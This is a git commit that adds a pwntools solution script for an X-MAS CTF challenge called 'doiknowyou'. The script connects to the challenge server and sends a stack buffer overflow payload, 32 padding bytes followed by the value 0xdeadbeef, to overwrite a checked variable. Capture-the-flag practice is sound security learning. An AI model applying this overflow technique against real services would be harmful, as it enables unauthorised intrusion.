f8ea3de759abe4ff2fa11d746de7fedeb3240a09
19520611 <61406160+19520611@users.noreply.github.com>
2020-12-15 20:40:15 +0700

    Add files via upload

---
+++ xmasCTF/src/doiknowyou/echall.py
@@ -0,0 +1,11 @@
+from pwn import *
+
+#p = process('./chall')
+p = remote('challs.xmas.htsp.ro',2008)
+v5 = 0xdeadbeef
+payload = "A"*0x20
+payload += p64(v5)
+
+p.recvuntil("Hi there. Do I recognize you?\n")
+p.sendline(payload)
+p.interactive()
